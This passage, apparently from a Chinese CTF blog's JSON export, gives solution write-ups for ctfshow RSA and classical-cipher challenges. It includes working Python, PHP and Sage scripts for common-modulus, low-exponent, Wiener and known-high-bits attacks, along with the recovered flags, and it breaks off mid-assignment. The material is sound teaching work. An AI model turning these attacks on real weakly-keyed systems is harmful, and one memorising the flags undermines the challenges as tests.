misc8明文攻击，得到解压密码56tygh，解压后扫描二维码得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://flag2020.top/tags/misc/"}]},{"title":"ctfshow——easyrsa系列","slug":"ctfshow——easyrsa系列","date":"2021-02-16T16:00:00.000Z","updated":"2021-04-09T15:19:53.823Z","comments":true,"path":"posts/20210217.html","link":"20210217","permalink":"https://flag2020.top/posts/20210217.html","excerpt":"ctfshow easyrsa1~8","text":"ctfshow easyrsa1~8 目录 easyrsa1：模数分解（factordb查询n） easyrsa2：利用公约数分解n（两个n共用一个p，gmpy2.gcd() 欧几里得算法） easyrsa3：共模攻击 easyrsa4：低加密指数攻击 easyrsa5：低解密指数攻击 easyrsa6：yafu分解模数（当p、q的取值差异过大或过于相近的时候） easyrsa7：RSA高位攻击（已知p的高位） easyrsa8：openssl解开公钥n和e easyrsa1题目：easyrsa1.txt e &#x3D; 65537 n &#x3D; 1455925529734358105461406532259911790807347616464991065301847 c &#x3D; 69380371057914246192606760686152233225659503366319332065009 模数分解：暴力分解n，得到p和q。 import gmpy2 import libnum e = 65537 n = 1455925529734358105461406532259911790807347616464991065301847 c = 69380371057914246192606760686152233225659503366319332065009 p = 1201147059438530786835365194567 q = 1212112637077862917192191913841 n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(int(m))) flag&#123;fact0r_sma11_N&#125; easyrsa2题目：easyrsa2 e &#x3D; 65537 n &#x3D; 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747 c &#x3D; 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815 e &#x3D; 65537 n &#x3D; 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711 c &#x3D; 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062 这道题有点像：[BJDCTF2020]RSA 所以尝试按照[BJDCTF2020]RSA的思路来解，先求两个n的最大公因数p，进而求q，接下就可以算出φ(n)，然后求出d后可算出m。 import gmpy2 import libnum c = 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815 e = 65537 n1 = 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747 n2 = 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711 q = gmpy2.gcd(n1, n2) p = n1//q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n1) print(libnum.n2s(int(m))) flag&#123;m0_bv_hv_sv&#125; easyrsa3题目：easyrsa3.txt e &#x3D; 797 n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571 c &#x3D; 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930 e &#x3D; 521 n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571 c &#x3D; 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849 RSA共模攻击：使用相同的模数 N 、不同的公钥，加密同一明文消息 import gmpy2 import libnum n = 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571 e1 = 797 e2 = 521 c1 = 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930 c2 = 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849 s = gmpy2.gcdext(e1, e2) # 扩展欧几里得算法 m1 = gmpy2.powmod(c1, s[1], n) m2 = gmpy2.powmod(c2, s[2], n) m = (m1*m2) % n print(libnum.n2s(int(m))) flag&#123;sh4r3_N&#125; easyrsa4题目：easyrsa4.txt e &#x3D; 3 n &#x3D; 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761 c &#x3D; 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661 低加密指数攻击：当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 import gmpy2 import libnum e = 3 n = 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761 c = 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661 m = gmpy2.iroot(c, e) # c开e次根 print(libnum.n2s(int(m[0]))) flag&#123;Sm4ll_eee&#125; easyrsa5题目：easyrsa5.txt e &#x3D; 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345 n &#x3D; 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231 c &#x3D; 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827 低解密指数攻击：与低加密指数相同，低解密指数可以加快解密的过程，但是也带来了安全问题。 rsa-wiener-attack： git clone https:&#x2F;&#x2F;github.com&#x2F;pablocelayes&#x2F;rsa-wiener-attack import gmpy2 import libnum import RSAwienerHacker e = 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345 n = 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231 c = 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827 d = RSAwienerHacker.hack_RSA(e, n) m = gmpy2.powmod(c, d, n) print(libnum.n2s(int(m))) easyrsa6题目：easyrsa6.py import gmpy2,libnum from Crypto.Util.number import getPrime from secret import flag e = 0x10001 p = getPrime(1024) q = gmpy2.next_prime(p) n = p * q print(\"n =\",n) m = libnum.s2n(flag) c = pow(m,e,n) print(\"c =\", c) # n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563 # c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257 使用RSA因数分解工具yafu：yafu用于自动整数因式分解，在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值。 import gmpy2 import libnum e = 0x10001 n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563 c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257 p = 163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385801 q = 163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385163 phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(int(m))) flag&#123;p&amp;q_4re_t00_c1o5ed&#125; easyrsa7题目：easyrsa7.txt e &#x3D; 0x10001 p&gt;&gt;128&lt;&lt;128 &#x3D; 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000 n &#x3D; 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3 c &#x3D; 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691 题目中已知e、n、c，还有p的高位，可以通过RSA高位攻击恢复p，接下来就是常规解题了。 sagemath工具太大，所以通过在线网站恢复：https://sagecell.sagemath.org/ p &#x3D; 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000 n &#x3D; 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3 pbits &#x3D; 1024 kbits &#x3D; 128 PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n)) f &#x3D; x + p x0 &#x3D; f.small_roots(X&#x3D;2 ^ kbits, beta&#x3D;0.4)[0] print(p+int(x0)) import gmpy2 import libnum e = 0x10001 n = 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3 c = 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691 p = 147305526294483975294006704928271118039370615054437206404408410848858740256154476278591035455064149531353089038270283281541411458250950936656537283482331598521457077465891874559349872035197398406708610440618635013091489698011474611145014167945729411970665381793142591665313979405475889978830728651549052207969 q = n//p phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(int(m))) flag&#123;Kn0wn_Hi9h_Bit5&#125; easyrsa8题目：easyrsa8.zip 压缩包里有两个文件 flag.enc public.key -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgTlUlVTKPIIMNZGz82fqFxZ3UlgR vFSyYIPIHCJxfSzCsQncqlVyt5QiNoI8b0UhrZesJYexcMdmkb57&#x2F;4OYKphkT8ok 5CFIOwE4CPE036NYe9OMh8e3uNp2VceEsF5C14m87sB4YmHe9qMGJwb9wjb9eA7s 7+h2HehtD5ZOUeHAEQIDAQAB -----END PUBLIC KEY----- 在kali中用openssl解开公钥n和e openssl rsa -pubin -text -modulus -in warmup -in public.key 分解n得到p和q，进而求出d，最后得到m import gmpy2 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP n = 0x39549554ca3c820c3591b3f367ea171677525811bc54b26083c81c22717d2cc2b109dcaa5572b7942236823c6f4521ad97ac2587b170c76691be7bff83982a98644fca24e421483b013808f134dfa3587bd38c87c7b7b8da7655c784b05e42d789bceec0786261def6a3062706fdc236fd780eecefe8761de86d0f964e51e1c011 e = 65537 p = 97 q = 106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609 phi = (p-1)*(q-1) d = int(gmpy2.invert(e, phi)) privatekey = RSA.construct((n, e, d, p, q)) rsa = PKCS1_OAEP.new(privatekey) m = rsa.decrypt(open(\"flag.enc\", \"rb\").read()) print(m) flag&#123;p_1s_5mall_num6er&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://flag2020.top/tags/crypto/"}]},{"title":"ctfshow——crypto","slug":"ctfshow——crypto","date":"2021-02-15T16:00:00.000Z","updated":"2021-04-09T14:01:31.564Z","comments":true,"path":"posts/20210216.html","link":"20210216","permalink":"https://flag2020.top/posts/20210216.html","excerpt":"ctfshow部分crypto题目","text":"ctfshow部分crypto题目 密码学签到题目：}wohs.ftc{galf hint：倒序 flag&#123;ctf.show&#125; crypto2题目：crypto2.txt jjencode编码，复制到控制台然后回车 flag&#123;3e858ccd79287cfe8509f15a71b4c45d&#125; crypto3题目：crypto3.txt aaencode编码，复制到控制台然后回车 flag&#123;js_da_fa_hao&#125; crypto4题目： p&#x3D;447685307 q&#x3D;2037 e&#x3D;17 提交flag&#123;d&#125;即可 import gmpy2 p = 447685307 q = 2037 e = 17 d = gmpy2.invert(e, (p-1)*(q-1)) print(d) flag&#123;53616899001&#125; crypto5题目： p&#x3D;447685307 q&#x3D;2037 e&#x3D;17 c&#x3D;704796792 提交flag&#123;m&#125; import gmpy2 p = 447685307 q = 2037 e = 17 c = 704796792 d = gmpy2.invert(e, (p-1)*(q-1)) m = pow(c, d, p*q) print(m) flag&#123;904332399012&#125; crypto6题目： 密钥为 加密方式 名称，区分大小写 crypto6.txt 密文： U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94 MqeD2xz+ 密钥： 加密方式名称 Rabbit：http://www.jsons.cn/rabbitencrypt/ flag&#123;a8db1d82db78ed452ba0882fb9554fc9&#125; crypto7题目：crypto7 Ook!：https://www.splitbrain.org/services/ook flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125; crypto8题目：crypto8.txt Brainfuck：https://www.splitbrain.org/services/ook flag&#123;99754106633f94d350db34d548d6091a&#125; crypto9网站打不开：http://serpent.online-domain-tools.com/ crypto10题目： 解密后 提交 flag&#123;明文&#125; crypto10.txt &#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82 quoted-printable编码：http://web.chacuo.net/charsetquotedprintable flag&#123;用你那火热的嘴唇让我在午夜里无尽的销魂&#125; crypto11题目： 密文：a8db1d82db78ed452ba0882fb9554fc 提交 flag&#123;明文&#125; md5解密：https://www.somd5.com/ flag&#123;ctf&#125; crypto0题目： gmbh&#123;ifmmp_dug&#125; 凯撒密码：https://www.qqxiuzi.cn/bianma/kaisamima.php 位移：1 flag&#123;hello_ctf&#125; crypto12题目： uozt&#123;Zgyzhv_xlwv_uiln_xguhsld&#125; 不用看了，没提示 埃特巴什码（Atbash Cipher）：http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/ 埃特巴什码：使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。 将小写的a改为A flag&#123;Atbase_code_from_ctfshow&#125; crypto13题目： 链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Q6qAdororzP0H7aIkoY1rg 提取码：7mjw 格式flag&#123;*****&#125; 脚本：来自：https://blog.csdn.net/i_kei/article/details/110086135 import base64 s = '' with open('base.txt', 'r', encoding='UTF-8') as f: s = ''.join(f.readlines()).encode('utf-8') src = s while True: try: src = s s = base64.b16decode(s) str(s, 'utf-8') continue except: pass try: src = s s = base64.b32decode(s) str(s, 'utf-8') continue except: pass try: src = s s = base64.b64decode(s) str(s, 'utf-8') continue except: pass break with open('result.txt', 'w', encoding='utf-8') as file: file.write(str(src, 'utf-8')) print(\"Decryption complete!\") flag&#123;b4Se_Fami1y_Is_FUn&#125; crypto14题目： 00110011 00110011 00100000 00110100 00110101 00100000 00110101 00110000 00100000 00110010 01100110 00100000 00110011 00110011 00100000 00110101 00110110 00100000 00110100 01100101 00100000 00110100 00110110 00100000 00110100 00110110 00100000 00110110 01100100 00100000 00110100 01100101 00100000 00110100 00110101 00100000 00110100 00110001 00100000 00110110 01100101 00100000 00110110 01100011 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110100 00100000 00110100 00110011 00100000 00110100 01100100 00100000 00110110 01100100 00100000 00110101 00110110 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110001 00100000 00110110 00110100 00100000 00110011 00111001 00100000 00110111 00110101 00100000 00110100 00110111 00100000 00110000 01100001 原理参考这篇文章：https://blog.csdn.net/miuzzx/article/details/104495832 用php写个脚本 &lt;?php $s = \"00110011 00110011 00100000 00110100 00110101 00100000 00110101 00110000 00100000 00110010 01100110 00100000 00110011 00110011 00100000 00110101 00110110 00100000 00110100 01100101 00100000 00110100 00110110 00100000 00110100 00110110 00100000 00110110 01100100 00100000 00110100 01100101 00100000 00110100 00110101 00100000 00110100 00110001 00100000 00110110 01100101 00100000 00110110 01100011 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110100 00100000 00110100 00110011 00100000 00110100 01100100 00100000 00110110 01100100 00100000 00110101 00110110 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110001 00100000 00110110 00110100 00100000 00110011 00111001 00100000 00110111 00110101 00100000 00110100 00110111 00100000 00110000 01100001\"; for ($i = 1; $i &lt;= 128; $i++) &#123; $s = str_replace(sprintf(\"%08d\", decbin($i)), chr($i), $s); &#125; $s = str_replace(\" \", \"\", $s); $s = hex2bin($s); $table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; for ($i = 0; $i &lt; strlen($s) - 1; $i++) &#123; $num = strpos($table, $s[$i]) - 30; $s[$i] = $table[$num]; &#125; echo base64_decode($s); flag&#123;看我长不长?&#125; 萌新_密码5题目： 由田中 由田井 羊夫 由田人 由中人 羊羊 由由王 由田中 由由大 由田工 由由由 由由羊 由中大 当铺密码：汉字有多少笔画出头，就是转化成数字几。 如：由=1，中=2 根据题目用php写个脚本 &lt;?php $table = \"由田中 由田井 羊夫 由田人 由中人 羊羊 由由王 由田中 由由大 由田工 由由由 由由羊 由中大\"; $table = str_replace(\"田\", \"0\", $table); $table = str_replace(\"由\", \"1\", $table); $table = str_replace(\"中\", \"2\", $table); $table = str_replace(\"人\", \"3\", $table); $table = str_replace(\"工\", \"4\", $table); $table = str_replace(\"大\", \"5\", $table); $table = str_replace(\"王\", \"6\", $table); $table = str_replace(\"夫\", \"7\", $table); $table = str_replace(\"井\", \"8\", $table); $table = str_replace(\"羊\", \"9\", $table); $num = explode(\" \", $table); for ($i = 0; $i &lt; count($num); $i++) &#123; echo chr($num[$i]); &#125; flag&#123;ctfshow&#125; babyrsa题目：babyrsa.txt e &#x3D; 65537 p &#x3D; 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179 q &#x3D; 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501 c &#x3D; 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194 import gmpy2 import libnum e = 65537 p = 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179 q = 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501 c = 